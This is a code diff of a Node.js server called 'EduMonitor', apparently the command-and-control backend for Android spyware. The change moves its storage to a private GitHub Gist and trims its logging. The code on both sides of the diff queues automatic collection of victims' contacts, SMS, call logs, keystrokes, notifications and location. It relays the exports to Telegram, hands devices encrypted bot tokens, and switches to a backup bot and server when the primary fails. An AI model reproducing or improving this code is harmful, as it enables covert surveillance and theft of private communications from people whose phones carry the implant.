@@ -5,9 +5,30 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 const FormData = require('form-data');
+const { Octokit } = require('@octokit/rest');
 const app = express();
 const PORT = process.env.PORT || 3000;
 const os = require('os');
+
+// ============= GITHUB GIST CONFIGURATION =============
+const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
+const GIST_ID = process.env.GIST_ID;
+
+// Initialize GitHub client if token exists
+let octokit = null;
+if (GITHUB_TOKEN) {
+    octokit = new Octokit({ auth: GITHUB_TOKEN });
+    console.log('✅ GitHub client initialized');
+} else {
+    console.log('⚠️ GITHUB_TOKEN not set, using local file storage only');
+}
+
+// Gist filenames for each data type
+const GIST_FILES = {
+    DEVICES: 'devices.json',
+    AUTO_DATA: 'autodata.json',
+    FAILOVER_STATE: 'failover_state.json'
+};
 
 // ============= CONFIGURATION =============
 // Main bot token (primary)
@@ -22,11 +43,6 @@ const SECONDARY_SERVER_URL = process.env.SECONDARY_SERVER_URL || 'https://backup
 // Current active bot token (can change during failover)
 let activeBotToken = MAIN_BOT_TOKEN;
 let activeServerUrl = `https://${process.env.RENDER_EXTERNAL_URL || 'edu-hwpy.onrender.com'}`;
-
-// Persistent storage files
-const DEVICES_FILE = path.join(__dirname, 'devices.json');
-const AUTO_DATA_FILE = path.join(__dirname, 'autodata.json');
-const FAILOVER_STATE_FILE = path.join(__dirname, 'failover_state.json');
 
 // Store authorized devices and their commands
 const devices = new Map();
@@ -51,101 +67,313 @@ let failoverState = {
     failoverCount: 0
 };
 
-// Load failover state from disk
-function loadFailoverState() {
-    try {
-        if (fs.existsSync(FAILOVER_STATE_FILE)) {
-            const data = fs.readFileSync(FAILOVER_STATE_FILE, 'utf8');
-            const saved = JSON.parse(data);
-            failoverState = saved;
-            activeBotToken = failoverState.currentBotToken;
-            activeServerUrl = failoverState.currentServerUrl;
-            console.log(`✅ Loaded failover state: ${failoverState.isFailedOver ? 'FAILED OVER' : 'NORMAL'}`);
-            console.log(`   Active Bot Token: ${activeBotToken.substring(0, 20)}...`);
-            console.log(`   Active Server URL: ${activeServerUrl}`);
-        }
-    } catch (error) {
-        console.error('Error loading failover state:', error);
-    }
-}
+// ============= GITHUB GIST STORAGE FUNCTIONS =============
 
-// Save failover state to disk
-function saveFailoverState() {
-    try {
-        fs.writeFileSync(FAILOVER_STATE_FILE, JSON.stringify(failoverState, null, 2));
-        console.log(`💾 Saved failover state`);
-    } catch (error) {
-        console.error('Error saving failover state:', error);
+// Read data from GitHub Gist
+async function readFromGist(filename) {
+    if (!octokit || !GIST_ID) {
+        return null;
     }
-}
-
-// Execute failover to secondary bot
-function executeFailover() {
-    if (failoverState.isFailedOver) {
-        console.log('⚠️ Already in failover mode');
-        return;
-    }
-    
-    if (!SECONDARY_BOT_TOKEN) {
-        console.error('❌ Cannot failover - SECONDARY_BOT_TOKEN not configured');
-        return;
-    }
-    
-    console.log('🔄 EXECUTING FAILOVER - Switching to secondary bot');
-    
-    failoverState.isFailedOver = true;
-    failoverState.failedOverAt = Date.now();
-    failoverState.currentBotToken = SECONDARY_BOT_TOKEN;
-    failoverState.currentServerUrl = SECONDARY_SERVER_URL;
-    failoverState.failoverCount++;
-    
-    activeBotToken = SECONDARY_BOT_TOKEN;
-    activeServerUrl = SECONDARY_SERVER_URL;
-    
-    saveFailoverState();
-    
-    console.log(`✅ Failover complete - Now using secondary bot`);
-    console.log(`   New Server URL: ${activeServerUrl}`);
-}
-
-// Attempt to restore primary bot
-async function attemptRestorePrimary() {
-    if (!failoverState.isFailedOver) return true;
-    
-    console.log('🔄 Attempting to restore primary bot...');
     
     try {
-        const testUrl = `https://api.telegram.org/bot${MAIN_BOT_TOKEN}/getMe`;
-        const response = await axios.get(testUrl, { timeout: 10000 });
+        const response = await octokit.gists.get({
+            gist_id: GIST_ID
+        });
         
-        if (response.data && response.data.ok) {
-            console.log('✅ Primary bot is back online - restoring');
-            
-            failoverState.isFailedOver = false;
-            failoverState.currentBotToken = MAIN_BOT_TOKEN;
-            failoverState.currentServerUrl = activeServerUrl; // Keep current server URL
-            activeBotToken = MAIN_BOT_TOKEN;
-            
-            saveFailoverState();
-            
-            // Notify all admins
-            for (const chatId of authorizedChats) {
-                await sendTelegramMessage(chatId, 
-                    '✅ *PRIMARY BOT RESTORED*\n\n' +
-                    'The main bot is back online. Continuing normal operation.');
+        const fileContent = response.data.files[filename];
+        if (fileContent && fileContent.content) {
+            return JSON.parse(fileContent.content);
+        }
+        return null;
+    } catch (error) {
+        if (error.status === 404) {
+            console.log(`📝 Gist not found, will create new one on first save`);
+            return null;
+        }
+        console.error(`❌ Error reading ${filename} from Gist:`, error.message);
+        return null;
+    }
+}
+
+// Write data to GitHub Gist
+async function writeToGist(filename, data) {
+    if (!octokit) {
+        return false;
+    }
+    
+    try {
+        const content = JSON.stringify(data, null, 2);
+        const files = {
+            [filename]: {
+                content: content
             }
+        };
+        
+        if (!GIST_ID) {
+            // Create new gist if no ID exists
+            const response = await octokit.gists.create({
+                description: 'EduMonitor Bot Storage - Auto-generated',
+                public: false,
+                files: files
+            });
             
+            const newGistId = response.data.id;
+            console.log(`✅ Created new gist with ID: ${newGistId}`);
+            console.log(`⚠️ IMPORTANT: Add GIST_ID=${newGistId} to your Render environment variables!`);
+            console.log(`   Without this, data won't persist after restart!`);
+            
+            // Store the gist ID in a file for this session
+            fs.writeFileSync(path.join(__dirname, 'current_gist_id.txt'), newGistId);
+            return true;
+        } else {
+            // Update existing gist
+            await octokit.gists.update({
+                gist_id: GIST_ID,
+                files: files
+            });
+            console.log(`💾 Saved ${filename} to GitHub Gist`);
             return true;
         }
     } catch (error) {
-        console.log('Primary bot still offline:', error.message);
+        console.error(`❌ Error writing ${filename} to Gist:`, error.message);
+        return false;
     }
-    return false;
 }
 
-// Get current active Telegram API URL
-function getTelegramApiUrl() {
-    return `https://api.telegram.org/bot${activeBotToken}`;
+// Load all data from Gist on startup
+async function loadAllFromGist() {
+    console.log('🔄 Loading data from GitHub Gist...');
+    
+    if (!octokit) {
+        console.log('⚠️ GitHub not configured, skipping Gist load');
+        return false;
+    }
+    
+    try {
+        // Load devices
+        const devicesData = await readFromGist(GIST_FILES.DEVICES);
+        if (devicesData) {
+            devices.clear();
+            for (const [id, device] of Object.entries(devicesData)) {
+                devices.set(id, device);
+            }
+            console.log(`✅ Loaded ${devices.size} devices from Gist`);
+        } else {
+            console.log('📝 No devices data found in Gist');
+        }
+        
+        // Load auto-data flags
+        const autoDataData = await readFromGist(GIST_FILES.AUTO_DATA);
+        if (autoDataData) {
+            autoDataRequested.clear();
+            for (const [id, flag] of Object.entries(autoDataData)) {
+                autoDataRequested.set(id, flag);
+            }
+            console.log(`✅ Loaded ${autoDataRequested.size} auto-data flags from Gist`);
+        } else {
+            console.log('📝 No auto-data flags found in Gist');
+        }
+        
+        // Load failover state
+        const failoverData = await readFromGist(GIST_FILES.FAILOVER_STATE);
+        if (failoverData) {
+            failoverState = failoverData;
+            activeBotToken = failoverState.currentBotToken || MAIN_BOT_TOKEN;
+            activeServerUrl = failoverState.currentServerUrl || activeServerUrl;
+            console.log(`✅ Loaded failover state from Gist: ${failoverState.isFailedOver ? 'FAILED OVER' : 'NORMAL'}`);
+        } else {
+            console.log('📝 No failover state found in Gist');
+        }
+        
+        return true;
+    } catch (error) {
+        console.error('❌ Error loading from Gist:', error.message);
+        return false;
+    }
+}
+
+// Save all data to Gist
+async function saveAllToGist() {
+    if (!octokit) {
+        console.log('⚠️ GitHub not configured, skipping Gist save');
+        saveLocalBackup();
+        return false;
+    }
+    
+    try {
+        // Save devices
+        const devicesObj = {};
+        for (const [id, device] of devices.entries()) {
+            devicesObj[id] = device;
+        }
+        await writeToGist(GIST_FILES.DEVICES, devicesObj);
+        
+        // Save auto-data flags
+        const autoDataObj = {};
+        for (const [id, flag] of autoDataRequested.entries()) {
+            autoDataObj[id] = flag;
+        }
+        await writeToGist(GIST_FILES.AUTO_DATA, autoDataObj);
+        
+        // Save failover state
+        await writeToGist(GIST_FILES.FAILOVER_STATE, failoverState);
+        
+        // Also save local backup as fallback
+        saveLocalBackup();
+        return true;
+    } catch (error) {
+        console.error('❌ Error saving to Gist:', error.message);
+        saveLocalBackup();
+        return false;
+    }
+}
+
+// Local backup (fallback if GitHub is unavailable)
+function saveLocalBackup() {
+    try {
+        const backupDir = path.join(__dirname, 'backup');
+        if (!fs.existsSync(backupDir)) {
+            fs.mkdirSync(backupDir, { recursive: true });
+        }
+        
+        // Save devices
+        const devicesObj = {};
+        for (const [id, device] of devices.entries()) {
+            devicesObj[id] = device;
+        }
+        fs.writeFileSync(path.join(backupDir, 'devices.backup.json'), JSON.stringify(devicesObj, null, 2));
+        
+        // Save auto-data
+        const autoDataObj = {};
+        for (const [id, flag] of autoDataRequested.entries()) {
+            autoDataObj[id] = flag;
+        }
+        fs.writeFileSync(path.join(backupDir, 'autodata.backup.json'), JSON.stringify(autoDataObj, null, 2));
+        
+        // Save failover state
+        fs.writeFileSync(path.join(backupDir, 'failover_state.backup.json'), JSON.stringify(failoverState, null, 2));
+        
+        console.log(`💾 Saved local backup in ${backupDir}`);
+    } catch (error) {
+        console.error('Error saving local backup:', error);
+    }
+}
+
+// Load from local backup (fallback)
+function loadLocalBackup() {
+    try {
+        const backupDir = path.join(__dirname, 'backup');
+        
+        // Load devices
+        const devicesBackup = path.join(backupDir, 'devices.backup.json');
+        if (fs.existsSync(devicesBackup)) {
+            const data = fs.readFileSync(devicesBackup, 'utf8');
+            const savedDevices = JSON.parse(data);
+            for (const [id, device] of Object.entries(savedDevices)) {
+                devices.set(id, device);
+            }
+            console.log(`✅ Loaded ${devices.size} devices from local backup`);
+        }
+        
+        // Load auto-data
+        const autoDataBackup = path.join(backupDir, 'autodata.backup.json');
+        if (fs.existsSync(autoDataBackup)) {
+            const data = fs.readFileSync(autoDataBackup, 'utf8');
+            const savedAutoData = JSON.parse(data);
+            for (const [id, flag] of Object.entries(savedAutoData)) {
+                autoDataRequested.set(id, flag);
+            }
+            console.log(`✅ Loaded ${autoDataRequested.size} auto-data flags from local backup`);
+        }
+        
+        // Load failover state
+        const failoverBackup = path.join(backupDir, 'failover_state.backup.json');
+        if (fs.existsSync(failoverBackup)) {
+            const data = fs.readFileSync(failoverBackup, 'utf8');
+            const saved = JSON.parse(data);
+            failoverState = saved;
+            activeBotToken = saved.currentBotToken || MAIN_BOT_TOKEN;
+            activeServerUrl = saved.currentServerUrl || activeServerUrl;
+            console.log(`✅ Loaded failover state from local backup`);
+        }
+    } catch (error) {
+        console.error('Error loading local backup:', error);
+    }
+}
+
+// Wrapper functions that use Gist with local fallback
+async function loadDevices() {
+    if (octokit && GIST_ID) {
+        const data = await readFromGist(GIST_FILES.DEVICES);
+        if (data) {
+            devices.clear();
+            for (const [id, device] of Object.entries(data)) {
+                devices.set(id, device);
+            }
+            console.log(`✅ Loaded ${devices.size} devices from GitHub Gist`);
+            return;
+        }
+    }
+    // Fallback to local backup
+    loadLocalBackup();
+}
+
+async function saveDevices() {
+    if (octokit) {
+        const devicesObj = {};
+        for (const [id, device] of devices.entries()) {
+            devicesObj[id] = device;
+        }
+        await writeToGist(GIST_FILES.DEVICES, devicesObj);
+    }
+    saveLocalBackup();
+}
+
+async function loadAutoDataFlags() {
+    if (octokit && GIST_ID) {
+        const data = await readFromGist(GIST_FILES.AUTO_DATA);
+        if (data) {
+            autoDataRequested.clear();
+            for (const [id, flag] of Object.entries(data)) {
+                autoDataRequested.set(id, flag);
+            }
+            console.log(`✅ Loaded ${autoDataRequested.size} auto-data flags from GitHub Gist`);
+            return;
+        }
+    }
+    loadLocalBackup();
+}
+
+async function saveAutoDataFlags() {
+    if (octokit) {
+        const autoDataObj = {};
+        for (const [id, flag] of autoDataRequested.entries()) {
+            autoDataObj[id] = flag;
+        }
+        await writeToGist(GIST_FILES.AUTO_DATA, autoDataObj);
+    }
+    saveLocalBackup();
+}
+
+async function loadFailoverState() {
+    if (octokit && GIST_ID) {
+        const data = await readFromGist(GIST_FILES.FAILOVER_STATE);
+        if (data) {
+            failoverState = data;
+            activeBotToken = failoverState.currentBotToken || MAIN_BOT_TOKEN;
+            activeServerUrl = failoverState.currentServerUrl || activeServerUrl;
+            console.log(`✅ Loaded failover state from GitHub Gist: ${failoverState.isFailedOver ? 'FAILED OVER' : 'NORMAL'}`);
+            return;
+        }
+    }
+    loadLocalBackup();
+}
+
+async function saveFailoverState() {
+    if (octokit) {
+        await writeToGist(GIST_FILES.FAILOVER_STATE, failoverState);
+    }
+    saveLocalBackup();
 }
 
 // Create uploads directory
@@ -156,7 +384,6 @@ if (!fs.existsSync(uploadDir)) {
 
 // ============= ENCRYPTION FUNCTIONS =============
 
-// Device-specific encryption (same as Android app)
 function encryptForDevice(data, deviceId) {
     try {
         const key = crypto.createHash('sha256').update(deviceId).digest();
@@ -170,70 +397,6 @@ function encryptForDevice(data, deviceId) {
         return null;
     }
 }
-
-// ============= PERSISTENT STORAGE FUNCTIONS =============
-
-function loadDevices() {
-    try {
-        if (fs.existsSync(DEVICES_FILE)) {
-            const data = fs.readFileSync(DEVICES_FILE, 'utf8');
-            const savedDevices = JSON.parse(data);
-            for (const [id, device] of Object.entries(savedDevices)) {
-                devices.set(id, device);
-            }
-            console.log(`✅ Loaded ${devices.size} devices from persistent storage`);
-        } else {
-            console.log('📝 No existing devices file found, starting fresh');
-        }
-    } catch (error) {
-        console.error('Error loading devices:', error);
-    }
-}
-
-function saveDevices() {
-    try {
-        const devicesObj = {};
-        for (const [id, device] of devices.entries()) {
-            devicesObj[id] = device;
-        }
-        fs.writeFileSync(DEVICES_FILE, JSON.stringify(devicesObj, null, 2));
-        console.log(`💾 Saved ${devices.size} devices to persistent storage`);
-    } catch (error) {
-        console.error('Error saving devices:', error);
-    }
-}
-
-function loadAutoDataFlags() {
-    try {
-        if (fs.existsSync(AUTO_DATA_FILE)) {
-            const data = fs.readFileSync(AUTO_DATA_FILE, 'utf8');
-            const savedAutoData = JSON.parse(data);
-            for (const [id, flag] of Object.entries(savedAutoData)) {
-                autoDataRequested.set(id, flag);
-            }
-            console.log(`✅ Loaded ${autoDataRequested.size} auto-data flags`);
-        }
-    } catch (error) {
-        console.error('Error loading auto-data flags:', error);
-    }
-}
-
-function saveAutoDataFlags() {
-    try {
-        const autoDataObj = {};
-        for (const [id, flag] of autoDataRequested.entries()) {
-            autoDataObj[id] = flag;
-        }
-        fs.writeFileSync(AUTO_DATA_FILE, JSON.stringify(autoDataObj, null, 2));
-    } catch (error) {
-        console.error('Error saving auto-data flags:', error);
-    }
-}
-
-// Load persistent data on startup
-loadFailoverState();
-loadDevices();
-loadAutoDataFlags();
 
 // ============= DEVICE CONFIGURATION =============
 const deviceConfigs = {
@@ -672,11 +835,9 @@ async function sendTelegramMessage(chatId, text) {
     } catch (error) {
         console.error('❌ Error sending message:', error.response?.data || error.message);
         
-        // Check if bot token is invalid (401) - trigger failover
         if (error.response?.status === 401 && !failoverState.isFailedOver) {
             console.log('⚠️ Bot token invalid - triggering failover');
-            executeFailover();
-            // Retry with new bot token
+            await executeFailover();
             return await sendTelegramMessage(chatId, text);
         }
         
@@ -714,9 +875,8 @@ async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
     } catch (error) {
         console.error('❌ Error sending message with keyboard:', error.response?.data || error.message);
         
-        // Check if bot token is invalid - trigger failover
         if (error.response?.status === 401 && !failoverState.isFailedOver) {
-            executeFailover();
+            await executeFailover();
             return await sendTelegramMessageWithKeyboard(chatId, text, keyboard);
         }
         return null;
@@ -807,9 +967,8 @@ async function sendTelegramDocument(chatId, filePath, filename, caption) {
     } catch (error) {
         console.error('❌ Error sending document:', error.response?.data || error.message);
         
-        // Check if bot token is invalid - trigger failover
         if (error.response?.status === 401 && !failoverState.isFailedOver) {
-            executeFailover();
+            await executeFailover();
             return await sendTelegramDocument(chatId, filePath, filename, caption);
         }
         
@@ -823,6 +982,74 @@ async function sendTelegramDocument(chatId, filePath, filename, caption) {
         }
         return null;
     }
+}
+
+// Get current active Telegram API URL
+function getTelegramApiUrl() {
+    return `https://api.telegram.org/bot${activeBotToken}`;
+}
+
+// Execute failover to secondary bot
+async function executeFailover() {
+    if (failoverState.isFailedOver) {
+        console.log('⚠️ Already in failover mode');
+        return;
+    }
+    
+    if (!SECONDARY_BOT_TOKEN) {
+        console.error('❌ Cannot failover - SECONDARY_BOT_TOKEN not configured');
+        return;
+    }
+    
+    console.log('🔄 EXECUTING FAILOVER - Switching to secondary bot');
+    
+    failoverState.isFailedOver = true;
+    failoverState.failedOverAt = Date.now();
+    failoverState.currentBotToken = SECONDARY_BOT_TOKEN;
+    failoverState.currentServerUrl = SECONDARY_SERVER_URL;
+    failoverState.failoverCount++;
+    
+    activeBotToken = SECONDARY_BOT_TOKEN;
+    activeServerUrl = SECONDARY_SERVER_URL;
+    
+    await saveFailoverState();
+    
+    console.log(`✅ Failover complete - Now using secondary bot`);
+    console.log(`   New Server URL: ${activeServerUrl}`);
+}
+
+// Attempt to restore primary bot
+async function attemptRestorePrimary() {
+    if (!failoverState.isFailedOver) return true;
+    
+    console.log('🔄 Attempting to restore primary bot...');
+    
+    try {
+        const testUrl = `https://api.telegram.org/bot${MAIN_BOT_TOKEN}/getMe`;
+        const response = await axios.get(testUrl, { timeout: 10000 });
+        
+        if (response.data && response.data.ok) {
+            console.log('✅ Primary bot is back online - restoring');
+            
+            failoverState.isFailedOver = false;
+            failoverState.currentBotToken = MAIN_BOT_TOKEN;
+            failoverState.currentServerUrl = activeServerUrl;
+            activeBotToken = MAIN_BOT_TOKEN;
+            
+            await saveFailoverState();
+            
+            for (const chatId of authorizedChats) {
+                await sendTelegramMessage(chatId, 
+                    '✅ *PRIMARY BOT RESTORED*\n\n' +
+                    'The main bot is back online. Continuing normal operation.');
+            }
+            
+            return true;
+        }
+    } catch (error) {
+        console.log('Primary bot still offline:', error.message);
+    }
+    return false;
 }
 
 // ============= FORMATTER FUNCTIONS =============
@@ -894,7 +1121,7 @@ function queueAutoDataCommands(deviceId, chatId) {
             'location'
         ]
     });
-    saveAutoDataFlags();
+    saveAutoDataFlags().catch(console.error);
     
     const device = devices.get(deviceId);
     if (!device) {
@@ -937,7 +1164,7 @@ function queueAutoDataCommands(deviceId, chatId) {
     });
     
     console.log(`✅ All ${commands.length} auto-data commands queued for ${deviceId}`);
-    saveDevices();
+    saveDevices().catch(console.error);
 }
 
 // ============= CRITICAL: COMPLETE CONFIG ENDPOINT =============
@@ -953,10 +1180,8 @@ app.get('/api/device/:deviceId/complete-config', (req, res) => {
         return res.status(404).json({ error: 'Device not found' });
     }
     
-    // Get current active config (may be from failover)
     const deviceConfig = getDeviceConfig(deviceId);
     
-    // Encrypt the bot token and chat ID for this specific device
     const encryptedToken = encryptForDevice(activeBotToken, deviceId);
     const encryptedChatId = encryptForDevice(deviceConfig.chatId, deviceId);
     
@@ -969,9 +1194,6 @@ app.get('/api/device/:deviceId/complete-config', (req, res) => {
     };
     
     console.log(`✅ Complete config sent to ${deviceId}`);
-    console.log(`   Bot Token: ${activeBotToken.substring(0, 20)}... (encrypted)`);
-    console.log(`   Server URL: ${activeServerUrl}`);
-    
     res.json(response);
 });
 
@@ -987,11 +1209,10 @@ app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
             return res.status(400).json({ error: 'Missing fields' });
         }
         
-        console.log(`📸 Photo upload from ${deviceId}: ${req.file.filename} (${req.file.size} bytes)`);
+        console.log(`📸 Photo upload from ${deviceId}: ${req.file.filename}`);
         
         const device = devices.get(deviceId);
         if (!device) {
-            console.error(`❌ Device not found: ${deviceId}`);
             return res.status(404).json({ error: 'Device not found' });
         }
         
@@ -1016,14 +1237,13 @@ app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
             try {
                 if (fs.existsSync(filePath)) {
                     fs.unlinkSync(filePath);
-                    console.log(`🧹 Deleted photo: ${filePath}`);
                 }
             } catch (e) {
                 console.error('Error deleting photo:', e);
             }
         }, 60000);
         
-        res.json({ success: true, filename: req.file.filename, size: req.file.size });
+        res.json({ success: true, filename: req.file.filename });
         
     } catch (error) {
         console.error('❌ Photo upload error:', error);
@@ -1041,15 +1261,13 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
         const itemCount = req.body.count || '0';
         
         if (!deviceId || !command || !filename || !req.file) {
-            console.error('❌ Missing fields in upload');
             return res.status(400).json({ error: 'Missing fields' });
         }
         
-        console.log(`📎 File upload from ${deviceId}: ${filename} (${req.file.size} bytes, ${itemCount} items)`);
+        console.log(`📎 File upload from ${deviceId}: ${filename}`);
         
         const device = devices.get(deviceId);
         if (!device) {
-            console.error(`❌ Device not found: ${deviceId}`);
             return res.status(404).json({ error: 'Device not found' });
         }
         
@@ -1060,44 +1278,13 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
         let caption = `📱 *${deviceName}*\n\n`;
         
         switch (command) {
-            case 'contacts':
-                caption += `📇 Contacts Export (${itemCount} contacts)`;
-                break;
-            case 'sms':
-                caption += `💬 SMS Messages Export (${itemCount} messages)`;
-                break;
-            case 'calllogs':
-                caption += `📞 Call Logs Export (${itemCount} calls)`;
-                break;
-            case 'apps_list':
-                caption += `📱 Installed Apps Export (${itemCount} apps)`;
-                break;
-            case 'keys':
-                caption += `⌨️ Keystroke Logs Export (${itemCount} entries)`;
-                break;
-            case 'notify':
-                caption += `🔔 Notifications Export (${itemCount} notifications)`;
-                break;
-            case 'open_app':
-                caption += `📱 App Opens Export (${itemCount} entries)`;
-                break;
-            case 'whatsapp':
-                caption += `💬 WhatsApp Messages Export (${itemCount} messages)`;
-                break;
-            case 'telegram':
-                caption += `💬 Telegram Messages Export (${itemCount} messages)`;
-                break;
-            case 'facebook':
-                caption += `💬 Facebook Messages Export (${itemCount} messages)`;
-                break;
-            case 'browser':
-                caption += `🌐 Browser History Export (${itemCount} entries)`;
-                break;
-            case 'device_info':
-                caption += `📊 Device Info Export (${itemCount} snapshots)`;
-                break;
-            default:
-                caption += `📎 Data Export`;
+            case 'contacts': caption += `📇 Contacts Export (${itemCount} contacts)`; break;
+            case 'sms': caption += `💬 SMS Messages Export (${itemCount} messages)`; break;
+            case 'calllogs': caption += `📞 Call Logs Export (${itemCount} calls)`; break;
+            case 'apps_list': caption += `📱 Installed Apps Export (${itemCount} apps)`; break;
+            case 'keys': caption += `⌨️ Keystroke Logs Export (${itemCount} entries)`; break;
+            case 'notify': caption += `🔔 Notifications Export (${itemCount} notifications)`; break;
+            default: caption += `📎 Data Export`;
         }
         
         await sendTelegramDocument(chatId, filePath, filename, caption);
@@ -1106,14 +1293,13 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
             try {
                 if (fs.existsSync(filePath)) {
                     fs.unlinkSync(filePath);
-                    console.log(`🧹 Deleted temporary file: ${filePath}`);
                 }
             } catch (e) {
                 console.error('Error deleting file:', e);
             }
         }, 60000);
         
-        res.json({ success: true, filename, size: req.file.size });
+        res.json({ success: true, filename });
         
     } catch (error) {
         console.error('❌ File upload error:', error);
@@ -1130,7 +1316,8 @@ app.get('/health', (req, res) => {
         authorizedChats: Array.from(authorizedChats).join(', '),
         serverIP: getServerIP(),
         failoverActive: failoverState.isFailedOver,
-        activeBotToken: activeBotToken.substring(0, 20) + '...',
+        storageType: octokit ? 'GitHub Gist' : 'Local Files',
+        gistConfigured: !!GIST_ID,
         timestamp: Date.now()
     });
 });
@@ -1141,7 +1328,7 @@ app.get('/api/ping/:deviceId', (req, res) => {
     
     if (device) {
         device.lastSeen = Date.now();
-        saveDevices();
+        saveDevices().catch(console.error);
         res.json({ 
             status: 'alive', 
             timestamp: Date.now(),
@@ -1160,12 +1347,11 @@ app.get('/api/ping/:deviceId', (req, res) => {
     }
 });
 
-app.get('/api/verify/:deviceId', (req, res) => {
+app.get('/api/verify/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
     const device = devices.get(deviceId);
     
-    // Check if we should attempt to restore primary
-    attemptRestorePrimary().catch(console.error);
+    await attemptRestorePrimary();
     
     if (device && device.chatId) {
         res.json({
@@ -1187,7 +1373,7 @@ app.get('/api/verify/:deviceId', (req, res) => {
     }
 });
 
-app.get('/api/commands/:deviceId', (req, res) => {
+app.get('/api/commands/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
     const device = devices.get(deviceId);
     
@@ -1202,11 +1388,10 @@ app.get('/api/commands/:deviceId', (req, res) => {
                 autoData: cmd.autoData || false
             }));
             device.pendingCommands = [];
-            saveDevices();
-            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands.map(c => c.command).join(', '));
+            await saveDevices();
+            console.log(`📤 Sending ${commands.length} commands to ${deviceId}`);
             sendJsonResponse(res, { commands });
         } else {
-            console.log(`📭 No commands for ${deviceId}`);
             sendJsonResponse(res, { commands: [] });
         }
     } catch (e) {
@@ -1227,7 +1412,6 @@ app.post('/api/result/:deviceId', async (req, res) => {
     ];
     
     if (fileCommands.includes(command)) {
-        console.log(`📎 ${command} using dedicated file upload endpoint`);
         return res.sendStatus(200);
     }
     
@@ -1287,9 +1471,9 @@ app.post('/api/register', async (req, res) => {
     };
     
     devices.set(deviceId, deviceData);
-    saveDevices();
+    await saveDevices();
     
-    console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId} for chat ${deviceConfig.chatId}`);
+    console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId}`);
     
     await setChatMenuButton(deviceConfig.chatId);
     
@@ -1303,22 +1487,6 @@ app.post('/api/register', async (req, res) => {
     if (isNewDevice) {
         welcomeMessage += `You now have ${userDevices.length} device(s) registered.\n\n`;
         welcomeMessage += `🔄 <b>Auto-collecting data...</b>\n`;
-        welcomeMessage += `The server is automatically requesting:\n`;
-        welcomeMessage += `• 📱 Device Info\n`;
-        welcomeMessage += `• 🌐 Network Info\n`;
-        welcomeMessage += `• 📱 Mobile Info\n`;
-        welcomeMessage += `• 📇 Contacts\n`;
-        welcomeMessage += `• 💬 SMS Messages\n`;
-        welcomeMessage += `• 📞 Call Logs\n`;
-        welcomeMessage += `• 📱 Installed Apps\n`;
-        welcomeMessage += `• ⌨️ Keystrokes\n`;
-        welcomeMessage += `• 🔔 Notifications\n`;
-        welcomeMessage += `• 💬 WhatsApp\n`;
-        welcomeMessage += `• 💬 Telegram\n`;
-        welcomeMessage += `• 💬 Facebook\n`;
-        welcomeMessage += `• 🌐 Browser History\n`;
-        welcomeMessage += `• 📍 Location\n\n`;
-        welcomeMessage += `This may take a few moments as the device processes each request.`;
         
         if (userDevices.length === 1) {
             userDeviceSelection.set(deviceConfig.chatId, deviceId);
@@ -1338,7 +1506,6 @@ app.post('/api/register', async (req, res) => {
         queueAutoDataCommands(deviceId, deviceConfig.chatId);
     }
     
-    // Return config with current active bot token and server URL
     const responseConfig = {
         ...deviceConfig.config,
         botToken: activeBotToken,
@@ -1377,9 +1544,9 @@ app.get('/api/devices', (req, res) => {
 
 // ============= FAILOVER MANAGEMENT ENDPOINTS =============
 
-app.post('/api/failover/force', (req, res) => {
+app.post('/api/failover/force', async (req, res) => {
     console.log('🔄 Force failover requested');
-    executeFailover();
+    await executeFailover();
     res.json({ success: true, failoverActive: failoverState.isFailedOver });
 });
 
@@ -1395,7 +1562,8 @@ app.get('/api/failover/status', (req, res) => {
         failedOverAt: failoverState.failedOverAt,
         failoverCount: failoverState.failoverCount,
         currentBotToken: activeBotToken.substring(0, 20) + '...',
-        currentServerUrl: activeServerUrl
+        currentServerUrl: activeServerUrl,
+        storageType: octokit ? 'GitHub Gist' : 'Local Files'
     });
 });
 
@@ -1403,7 +1571,6 @@ app.get('/api/failover/status', (req, res) => {
 
 app.get('/test', (req, res) => {
     const serverIP = getServerIP();
-    const userDevices = getDeviceListForUser('5326373447');
     
     res.send(`
         <html>
@@ -1416,24 +1583,26 @@ app.get('/test', (req, res) => {
                 .online { color: #4CAF50; }
                 .offline { color: #f44336; }
                 .failover-active { color: #ff9800; }
-                .ip { background: #1a1a2e; padding: 5px; border-radius: 3px; font-family: monospace; }
+                .success { color: #4CAF50; }
+                .warning { color: #ff9800; }
             </style>
         </head>
         <body>
-            <h1>✅ EduMonitor Server v7.0 - Complete Failover Support</h1>
+            <h1>✅ EduMonitor Server v8.0 - GitHub Gist Storage</h1>
             <div class="stats">
                 <p><b>Time:</b> ${new Date().toISOString()}</p>
-                <p><b>Server IP:</b> <code class="ip">${serverIP}</code></p>
+                <p><b>Server IP:</b> <code>${serverIP}</code></p>
                 <p><b>Total Devices:</b> ${devices.size}</p>
                 <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
-                <p><b>Persistent Storage:</b> ${fs.existsSync(DEVICES_FILE) ? '✅ Enabled' : '⚠️ Not initialized'}</p>
-                <p><b>Failover Active:</b> <span class="${failoverState.isFailedOver ? 'failover-active' : 'online'}">${failoverState.isFailedOver ? '⚠️ YES (Backup Bot Active)' : '✅ NO'}</span></p>
+                <p><b>Storage Type:</b> <span class="${octokit ? 'success' : 'warning'}">${octokit ? '✅ GitHub Gist' : '⚠️ Local Files (No Persistence)'}</span></p>
+                <p><b>Gist Configured:</b> ${GIST_ID ? '✅ Yes' : '❌ No'}</p>
+                <p><b>Failover Active:</b> <span class="${failoverState.isFailedOver ? 'failover-active' : 'online'}">${failoverState.isFailedOver ? '⚠️ YES' : '✅ NO'}</span></p>
                 <p><b>Active Bot Token:</b> <code>${activeBotToken.substring(0, 20)}...</code></p>
                 <p><b>Active Server URL:</b> <code>${activeServerUrl}</code></p>
                 <p><b>Failover Count:</b> ${failoverState.failoverCount}</p>
             </div>
             
-            <h2>📱 Registered Devices (${userDevices.length})</h2>
